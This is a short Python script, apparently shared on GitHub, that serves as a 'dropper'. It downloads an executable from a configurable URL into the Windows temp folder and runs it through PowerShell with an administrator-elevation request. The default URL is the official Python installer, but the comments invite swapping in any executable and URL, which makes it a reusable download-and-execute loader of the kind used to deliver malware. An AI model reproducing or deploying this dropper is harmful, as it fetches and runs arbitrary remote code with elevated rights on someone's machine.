#-Creator: I-DoNt-LiKe-Micro-Soft
#-Github: https://github.com/I-DoNt-LiKe-Micro-Soft
#-Python(3.11)
from urllib.request import urlretrieve
from os import environ
from subprocess import run

class main:
    
    def __init__(self):
        self.nameoftheexecutable = "python-3.11.2-amd64.exe" #-The full name of the executable you are trying to download must go here
        self.url = "https://www.python.org/ftp/python/3.11.2/"+self.nameoftheexecutable #-The download url must go here excluding the filename
        self.downloadpath = environ["temp"]

    def dropper(self):
        urlretrieve(self.url, r""+self.downloadpath+"/"+self.nameoftheexecutable)

    def executor(self):
        run("powershell.exe Start-Process "+self.downloadpath+"/"+self.nameoftheexecutable+" -Verb runAs", shell = True)

MyObj = main()

MyObj.dropper()

MyObj.executor()
